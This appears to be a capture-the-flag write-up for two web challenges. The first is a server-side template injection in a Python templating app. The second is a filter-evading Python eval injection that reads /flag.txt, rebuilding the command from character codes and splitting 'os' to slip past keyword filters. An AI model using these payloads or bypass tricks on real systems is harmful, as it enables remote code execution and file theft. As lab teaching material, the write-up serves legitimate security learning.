# SSTI1 - web

## Challenge Overview

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website .

**Hint**

- Server Side Template Injection

## Enumeration

Lets visit the site.  
![image](https://gist.github.com/user-attachments/assets/7c3cbfc1-5b40-4fd9-86a8-caf105e59bca)

We try `test` as an input to see the output while monitoring the requests using burp suite.

The input is reflected back to us on the `announcement` page.

## Exploitation

From the hint we know that we have to exploit a `server side template injection`.  
Did some reading and found [this](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#python) perfect for getting to understand the vulnerability and example exploits.

To test for ssti we use `{{7*7}}` , if it prints `49` then that confirms we have `ssti`.  
To identify the language we can use `{{7*'7'}}` if we get `7777777` then it confirms that we have python and we can use a python payload.

Now that we have python let’s grab our payload.

```python
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

This will list the files in the current directory.

For this we are interested with the `flag` .

# 3v@l - web

## Challenge Overview

ABC Bank’s website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank’s calculator and read the flag?

Additional details will be available after launching your challenge instance.

We follow the link to get this page.

The program just performs basic mathematical calculations.  
Here is what we get from the source code:

```html
<!DOCTYPE html>

                <textarea id="code" name="code" class="form-control" rows="10" cols="50" placeholder="example: PRT*RATE*TIME(10000*23*12)" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>
        <div class="footer-link mt-4">
            <a href="/">Go back</a>
        </div>
    </div>
</body>
</html>
```

With that let’s understand the challenge:  
The server:

- Restrict dangerous keywords like os, exec, eval, socket, bind, etc.
- Prevent command injections and file access (ls, cat, shell).
- Regex Filtering, Blocking hexadecimal, Unicode, URL encoding, and directory traversal patterns.

Now that we know the flag is stored in `/flag.txt`, we need to bypass the security restrictions in the Flask app and extract the file contents.  
Here i tried a bunch of tricks but here is the one that worked.

If this succeeds, it might reveal an `os` or `popen` class, which we can use to run commands.

Lets understand the Payload i used:  
The payload:

```python
__import__('o'+'s').popen(''.join(chr(x) for x in [99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116])).read()
```

This successfully bypassed security filters and executed `cat /flag.txt`.  
Let’s break it down step by step.

1️⃣ Bypassing import os Restriction

```python
__import__('o'+'s')
```

- `__import__('os')` dynamically imports the os module.
- Instead of “os”, we used ‘o’ + ‘s’ to evade static keyword detection.

2️⃣ Constructing the Command Without Using “cat” Directly

```python
''.join(chr(x) for x in [99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116])
```

- This dynamically reconstructs the string “cat /flag.txt” using ASCII values:

```
Char	ASCII Code
c    	99
a    	97
t    	116
(space)	32
/    	47
f    	102
l    	108
a    	97
g    	103
.    	46
t    	116
x    	120
t    	116
```

- Instead of writing `cat /flag.txt` directly (which might get detected), we generate it dynamically using chr().

3️⃣ Executing the Command

```python
__import__('o'+'s').popen(COMMAND).read()
```

- popen(COMMAND).read() executes the command in a subprocess shell and reads the output.
- Since we bypassed “cat” detection, the system executed cat /flag.txt successfully.
